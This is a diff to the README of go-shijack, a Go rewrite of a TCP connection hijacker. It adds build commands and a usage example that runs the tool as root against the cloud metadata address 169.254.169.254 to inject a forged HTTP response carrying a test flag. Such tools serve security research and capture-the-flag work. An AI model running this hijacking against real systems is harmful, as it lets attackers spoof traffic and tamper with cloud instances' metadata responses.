@@ -2,9 +2,30 @@
 
 tcp connection hijacker, go rewrite of shijack from 2001.
 
+## build
+
+```
+make go-shijack
+```
+
+```
+make container
+```
+
+```
+CGO_ENABLED=0 go install github.com/ssst0n3/go-shijack/cmd/go-shijack@v0.1.0
+```
+
 ## usage
 
 ```
+root@ecs-c5a4:~# cat > flag << EOF
+
+HTTP/1.1 200 OK
+Content-Length: 11
+
+flag{test}
+EOF
 root@ecs-c5a4:~# ./go-shijack -t eth0 -i 169.254.169.254 -p 80 -f flag &
 [1] 362712
 root@ecs-c5a4:~# curl http://169.254.169.254
